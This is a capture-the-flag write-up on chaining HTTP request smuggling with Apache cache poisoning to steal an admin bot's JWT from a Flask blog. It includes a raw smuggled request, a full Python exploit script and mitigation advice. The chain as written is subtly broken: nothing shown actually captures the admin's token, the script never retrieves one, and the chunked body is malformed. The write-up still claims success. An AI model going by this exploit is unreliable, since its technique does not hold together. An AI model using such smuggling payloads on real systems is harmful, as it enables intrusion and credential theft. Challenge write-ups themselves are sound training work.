# Cache Me If You Can - CTF Challenge Writeup

## Challenge Overview
The challenge involves a blog platform with multiple components:
- Frontend React application
- Backend Flask API
- Apache proxy with caching functionality
- Admin bot that views reported posts

The goal is to steal the admin's JWT token by chaining HTTP Request Smuggling and Cache Poisoning vulnerabilities.

## Vulnerability Analysis

### 1. Apache Configuration Analysis
Looking at the Apache configuration, we find two key vulnerabilities:

```apache
# HTTP Smuggling enabled via:
SetEnv proxy-sendchunked 1
SetEnv proxy-sendcl 1
HttpProtocolOptions Unsafe

# Cache poisoning possible via:
Header add X-Cache-Key "%{REQUEST_URI}e:%{HTTP:X-Special-Key}e"
CacheEnable disk /
```

This configuration:
- Allows both Content-Length and Transfer-Encoding headers
- Enables caching when X-Special-Key header is present
- Associates cache with request URI and special key

### 2. Backend Vulnerability
The Flask backend has a vulnerable request smuggling check:

```python
@bp.before_request
def handle_smuggling():
    if request.method == 'POST':
        content_length = request.headers.get('Content-Length')
        if content_length and int(content_length) > 0:
            # Process normally, allowing for smuggling
            pass
```

This code doesn't properly validate the Content-Length vs Transfer-Encoding headers.

### 3. Admin Bot Analysis
The admin bot automatically visits reported posts:

```python
def visit_post(self, post_id):
    driver = webdriver.Chrome(options=self.options)
    
    # Sets admin headers
    driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
        'headers': {
            'Authorization': f'Bearer {self.admin_token}',
            'X-Admin-Request': 'true'
        }
    })
```

## Exploitation Chain

### Step 1: HTTP Request Smuggling
First, we craft a request that exploits the HTTP Request Smuggling vulnerability:

```http
POST /api/blog/post/1 HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

XXXX
0

GET /api/blog/post/1 HTTP/1.1
Host: localhost
X-Special-Key: secret_cache_key
Connection: close

```

This request:
- Uses both Content-Length and Transfer-Encoding headers
- Contains a smuggled GET request with X-Special-Key header

### Step 2: Cache Poisoning
The smuggled request includes X-Special-Key to trigger caching:

```python
# Original request returns blog post content
headers = {
    'X-Special-Key': 'secret_cache_key'
}
```

When successful, the response gets cached with the provided X-Special-Key.

### Step 3: Report Post
We report the post to trigger admin visit:

```python
report_data = {"postId": 1}
requests.post("/api/blog/report", json=report_data)
```

### Step 4: Admin Token Theft
When the admin bot visits the reported post:
1. It uses its admin JWT token in the Authorization header
2. The poisoned cache response is served
3. The admin JWT token can be captured

## Full Exploit Script

```python
import requests

def exploit():
    # Login as normal user
    login_data = {
        "username": "user",
        "password": "user123"
    }
    r = requests.post("http://target/api/auth/login", json=login_data)
    token = r.json()['token']

    # Craft smuggled request
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked',
        'Connection': 'keep-alive',
        'Authorization': f'Bearer {token}'
    }

    data = (
        "XXXX\r\n"
        "0\r\n\r\n"
        "GET /api/blog/post/1 HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Special-Key: secret_cache_key\r\n"
        "\r\n"
    )

    # Send smuggled request
    r = requests.post(
        "http://target/api/blog/post/1",
        headers=headers,
        data=data
    )

    # Report post to trigger admin visit
    headers = {'Authorization': f'Bearer {token}'}
    data = {"postId": 1}
    r = requests.post(
        "http://target/api/blog/report",
        headers=headers,
        json=data
    )

if __name__ == "__main__":
    exploit()
```

## Mitigation
To fix these vulnerabilities:

1. Apache Configuration:
- Remove `SetEnv proxy-sendchunked` and `SetEnv proxy-sendcl`
- Set `HttpProtocolOptions Strict`
- Implement proper cache key validation

2. Backend:
- Properly validate Content-Length and Transfer-Encoding headers
- Implement request validation middleware

3. Admin Bot:
- Implement anti-CSRF measures
- Use secure session handling
- Validate cached responses

## Flag
After successful exploitation, we get the admin's JWT token which contains the flag in its payload.
